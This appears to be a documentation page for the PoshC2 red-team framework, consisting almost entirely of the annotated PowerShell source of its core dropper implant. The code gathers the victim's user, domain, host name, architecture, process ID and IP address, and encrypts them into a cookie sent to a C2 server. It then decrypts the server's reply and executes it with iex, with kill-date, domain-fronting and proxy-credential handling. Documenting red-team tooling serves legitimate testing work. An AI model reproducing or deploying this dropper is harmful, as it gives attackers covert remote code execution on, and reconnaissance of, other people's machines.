################
  Core Dropper
################

The following code contains the core implant which is the basis for all droppers found in PoshC2::

	# PoshC2 Server Url
	$s="https://www.example.com"

	# creates a randon AES symetric encryption key
	function CAM ($key,$IV){
	  $a = New-Object -TypeName "System.Security.Cryptography.RijndaelManaged"
	  $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
	  $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
	  $a.BlockSize = 128
	  $a.KeySize = 256
	  if ($IV) {
	    if ($IV.getType().Name -eq "String") {
	      $a.IV = [System.Convert]::FromBase64String($IV)
	    } else {
	      $a.IV = $IV
	    }
	  }
	  if ($key) {
	    if ($key.getType().Name -eq "String") {
	      $a.Key = [System.Convert]::FromBase64String($key)
	    } else {
	      $a.Key = $key
	    }
	  }
	  $a
	}

	# encryption utility 
	function ENC ($key,$un) {
	  $b = [System.Text.Encoding]::UTF8.GetBytes($un)
	  $a = CAM $key
	  $e = $a.CreateEncryptor()
	  $f = $e.TransformFinalBlock($b, 0, $b.Length)
	  [byte[]] $p = $a.IV + $f
	  [System.Convert]::ToBase64String($p)
	}

	# decryption utility 
	function DEC ($key,$enc) {
	  $b = [System.Convert]::FromBase64String($enc)
	  $IV = $b[0..15]
	  $a = CAM $key $IV
	  $d = $a.CreateDecryptor()
	  $u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
	  [System.Text.Encoding]::UTF8.GetString($u)
	}

	# webclient function that handles all PoshC2 web requests
	function Get-Webclient ($Cookie) {
      # only execute if the kill date has not passed
	  $d = (Get-Date -Format "dd/MM/yyyy");
	  $d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
	  $k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);

	  if ($k -lt $d) {exit}

	  # proxy details if required  
	  $username = ""
	  $password = ""
	  $proxyurl = ""

	  $wc = New-Object System.Net.WebClient; 

	  # domain front header
	  $h=""

	  if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {
	    $wc.Headers.Add("Host",$h)
	  } elseif($h) {
	    $script:s="https://$($h)/'+$connect+'"
	  }

	  # add the useragent and referer header if required
	  $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
	  $wc.Headers.Add("Referer","")
  
      # if there is proxy details setup the object
	  if ($proxyurl) {
	    $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
  
	    if ($username -and $password) {
	      $PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
	      $getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
	      $wp.Credentials = $getcreds;
	    } else { 
	      $wc.UseDefaultCredentials = $true; 
	    }
  
	    $wc.Proxy = $wp; } else { 
	    $wc.UseDefaultCredentials = $true; 
	    $wc.Proxy.Credentials = $wc.Credentials;
	  } 
  
  	  # if the request uses a cookie add here
	  if ($cookie) { 
	  $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") 
	  }

	# return the web request object
	$wc 

	} 

	# primer function to get key values for new implant
	function primer {
	  if ($env:username -eq "$($env:computername)$") {
	    $u="NT AUTHORITY\SYSTEM"
	  } else {
	    $u=$env:username
	  }
	  $o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'"
	  $pp=enc -key '+$enckey+' -un $o
	  $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
	  dec -key '+$enckey+' -enc $primer
	} 

	$primer = primer

	# once the core implant has been downloaded sucessfully pass to IEX
	if ($primer) {
		$primer | iex
	} else {
	# else wait 120 seconds and try again
		start-sleep 120
		primer | iex 
	}
